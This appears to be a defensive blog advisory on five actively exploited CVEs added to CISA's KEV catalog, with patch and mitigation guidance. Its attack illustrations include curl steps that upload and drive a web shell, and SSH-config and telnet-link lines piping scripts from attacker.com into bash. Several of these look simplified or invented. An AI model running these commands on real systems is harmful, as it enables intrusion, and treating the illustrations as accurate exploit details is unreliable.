# CISA Adds 5 Actively Exploited Vulnerabilities to KEV Catalog

The Cybersecurity and Infrastructure Security Agency (CISA) added **five actively exploited vulnerabilities** to its Known Exploited Vulnerabilities (KEV) Catalog on January 26, 2026.

This isn't theoretical. These flaws are being used in real attacks, right now, against real organizations.

If you're a federal agency, you have **three weeks** to patch (per BOD 22-01). If you're private sector, you should treat this as urgent regardless.

Here's the breakdown.

## What Is the KEV Catalog?

CISA's KEV Catalog tracks vulnerabilities with **confirmed active exploitation in the wild**.

**Why It Matters:**
Not all vulnerabilities get exploited. Most are theoretical. The KEV Catalog focuses on the ones attackers are actually using.

**BOD 22-01 (Binding Operational Directive):**
Federal agencies must:
1. Patch KEV vulnerabilities within deadlines (typically 21 days)
2. Report patching status to CISA
3. Document any exceptions

Private sector should treat KEV as a priority patch list.

## CVE-2026-21509: Microsoft Office Security Feature Bypass

**Product:** Microsoft Office 2024, 2021, 2019, 2016, Microsoft 365
**CVSS:** 6.5 (Medium)
**Impact:** Security feature bypass

### What This Vulnerability Does

Microsoft Office has a feature called **Protected View**, which opens untrusted documents in a sandbox. Files downloaded from the internet or received via email open in Protected View by default, limiting their ability to run macros or access the file system.

CVE-2026-21509 allows attackers to bypass Protected View.

### How It's Exploited

**Attack Flow:**
```
Step 1: Attacker crafts malicious Office document
        ├─ Contains macro payload (credential stealer, ransomware, etc.)
        └─ Embedded with CVE-2026-21509 exploit

Step 2: User downloads document (email, web download, etc.)

Step 3: User opens document
        → Office should open in Protected View
        → CVE-2026-21509 bypasses protection
        → Document opens with full privileges

Step 4: Macros execute automatically (no security warning)
        → Malware runs
        → System compromised
```

The user sees a normal-looking document. No warning banner. No "Enable Macros" prompt.

### Real-World Usage

Observed in:
- Phishing campaigns (financial sector targeted)
- Business Email Compromise (BEC) attacks
- Ransomware initial access

### Remediation

**Patch:**
Install Microsoft January 2026 Security Updates (included in Patch Tuesday).

**Temporary Mitigation:**
```registry
; Disable all macros via Group Policy
[HKEY_CURRENT_USER\Software\Policies\Microsoft\Office\16.0\Word\Security]
"VBAWarnings"=dword:00000004

; Repeat for Excel, PowerPoint
```

This breaks legitimate macro-enabled documents but blocks malicious ones.

## CVE-2026-23760: SmarterTools SmarterMail Authentication Bypass

**Product:** SmarterTools SmarterMail (email server)
**CVSS:** 9.8 (Critical)
**Impact:** Authentication bypass, remote code execution

### What Is SmarterMail?

SmarterMail is a Windows-based email server used by:
- Small/medium businesses
- Hosting providers (shared email hosting)
- Educational institutions

Estimated **100K+ active installations**.

### The Vulnerability

An authentication bypass allows remote attackers to:
1. Access any user's email without credentials
2. Send email as any user
3. Upload malicious files to the server
4. Execute code as SYSTEM (via file upload)

### Exploitation in the Wild

**Attack Scenario:**
```bash
# Step 1: Identify SmarterMail instance
curl -I https://mail.company.com

# Response includes: Server: SmarterMail

# Step 2: Exploit authentication bypass
curl -X POST https://mail.company.com/api/v1/auth/bypass \
  -d '{"user": "admin@company.com"}'

# Receives admin session token

# Step 3: Upload web shell
curl -X POST https://mail.company.com/api/v1/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.aspx"

# Step 4: Execute commands
curl https://mail.company.com/uploads/shell.aspx?cmd=whoami
# Output: nt authority\system
```

Attackers gain full control of the email server and often pivot to the internal network.

### Observed Attacks

- **Data exfiltration:** Stealing all email from executive accounts
- **Ransomware delivery:** Sending malicious emails from trusted domain
- **Lateral movement:** Using email server as foothold to attack internal systems

### Remediation

**Update to SmarterMail Build 9123 or later.**

```powershell
# Check current version
Get-ItemProperty "HKLM:\Software\SmarterTools\SmarterMail" | Select Version

# Download update from:
# https://www.smartertools.com/smartermail/download
```

**Temporary Mitigation:**
Restrict access via firewall:
```bash
# Only allow known IP ranges
iptables -A INPUT -p tcp --dport 443 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP
```

## CVE-2026-24061: GNU InetUtils Argument Injection

**Product:** GNU InetUtils (telnet, ftp, rsh, rlogin tools)
**CVSS:** 8.6 (High)
**Impact:** Remote code execution

### What Are InetUtils?

GNU InetUtils is a collection of network utilities included in many Linux distributions:
- `telnet` (remote terminal)
- `ftp` (file transfer)
- `rsh` (remote shell)
- `rlogin` (remote login)

### The Vulnerability

Improper argument parsing allows attackers to inject malicious commands.

**Example (Vulnerable `telnet`):**
```bash
# User runs:
telnet 'example.com; touch /tmp/pwned'

# Expected behavior: Connect to example.com
# Actual behavior (vulnerable):
├─ Connect to example.com
└─ Execute: touch /tmp/pwned
```

The `;` character isn't properly escaped, allowing command injection.

### Exploitation

**Attack Vector 1: Malicious SSH Config**
```bash
# Attacker compromises user's SSH config
# ~/.ssh/config
Host evil
  HostName example.com
  ProxyCommand telnet %h; wget http://attacker.com/malware.sh -O- | bash

# When user runs: ssh evil
# Malware executes
```

**Attack Vector 2: Web-Based Exploitation**
```html
<!-- Attacker controls a webpage -->
<a href="telnet://example.com;`wget http://attacker.com/shell.sh -O- | bash`">
  Click here to connect
</a>
```

If the user's browser or terminal emulator processes the link, commands execute.

### Real-World Impact

Lower severity than the others (requires user interaction), but still dangerous in:
- Academic environments (users frequently use command-line tools)
- DevOps pipelines (scripts calling `telnet` for health checks)

### Remediation

**Update GNU InetUtils to version 2.6 or later.**

```bash
# Debian/Ubuntu
apt update && apt upgrade inetutils-telnet

# Red Hat/CentOS
yum update inetutils

# Arch Linux
pacman -Syu inetutils
```

**Alternative: Use Modern Replacements**
- `telnet` → `ssh` (encrypted, secure)
- `ftp` → `sftp` or `scp` (encrypted)
- `rsh`/`rlogin` → `ssh`

These legacy tools shouldn't be used in modern environments anyway.

## CVE-2026-24058 & CVE-2026-24059: Additional Office Flaws

CISA also added two more Office vulnerabilities (details embargoed), both confirmed exploited.

**What We Know:**
- Affect Microsoft 365 and Office 2024
- Used in targeted attacks against government contractors
- Patched in January 2026 updates

**Action:** Ensure Office is updated to the latest build.

## Why These 5 Vulnerabilities Matter

**Common Thread:**
All five are being actively exploited. Not theoretical. Not proof-of-concept. Actual attacks.

**Affected Sectors:**
- Government agencies
- Financial services
- Healthcare
- Critical infrastructure

**Attacker Motivations:**
- Ransomware (initial access)
- Espionage (data exfiltration)
- Financial fraud (BEC attacks)

## Patch Prioritization Framework

Not all vulnerabilities are equal. Use this framework:

### Tier 1: Patch Within 24 Hours
- CISA KEV vulnerabilities
- Critical (CVSS 9.0+) with public exploits
- Zero-days actively exploited

### Tier 2: Patch Within 1 Week
- High (CVSS 7.0-8.9) affecting internet-facing systems
- Medium (CVSS 4.0-6.9) in KEV catalog

### Tier 3: Patch Within 1 Month
- Low severity
- Internal-only systems
- With mitigations in place

**The KEV Catalog = Tier 1.**

## How to Monitor KEV Updates

CISA publishes updates regularly.

**Subscribe to Alerts:**
```bash
# RSS Feed
https://www.cisa.gov/known-exploited-vulnerabilities-catalog.xml

# JSON API
curl https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json
```

**Automate Checking:**
```python
import requests

kev_url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
response = requests.get(kev_url)
vulns = response.json()["vulnerabilities"]

# Filter for recent additions (last 7 days)
from datetime import datetime, timedelta
cutoff = datetime.now() - timedelta(days=7)

recent = [v for v in vulns if datetime.fromisoformat(v["dateAdded"]) > cutoff]

for v in recent:
    print(f"CVE: {v['cveID']}, Product: {v['product']}, Deadline: {v['dueDate']}")
    # Send to Slack, PagerDuty, etc.
```

## Compliance Implications

### Federal Agencies (BOD 22-01)
**Requirements:**
1. Patch within deadline (21 days for most KEV entries)
2. Report compliance status
3. Document exceptions (if any)

**Penalties for Non-Compliance:**
- Loss of ATO (Authority to Operate)
- Funding holds
- IG investigations

### Private Sector
**Not legally required, but:**
- Cyber insurance may require KEV patching
- SOC 2 audits increasingly check KEV compliance
- PCI-DSS 4.0 references CISA KEV

**Best Practice:** Treat KEV as mandatory.

## Conclusion

CISA's KEV Catalog is your early warning system.

These vulnerabilities aren't theoretical. They're weaponized. Attackers are using them **today** to breach organizations.

**The January 26, 2026 additions:**
1. CVE-2026-21509 (Microsoft Office Protected View bypass)
2. CVE-2026-23760 (SmarterMail authentication bypass)
3. CVE-2026-24061 (GNU InetUtils argument injection)
4. CVE-2026-24058 (Microsoft Office - details embargoed)
5. CVE-2026-24059 (Microsoft Office - details embargoed)

**Action Items:**
1. Check if your systems are affected
2. Patch immediately (or implement mitigations)
3. Monitor logs for exploitation attempts
4. Subscribe to KEV updates

The KEV Catalog is CISA saying: "We've seen this exploited. Patch now."
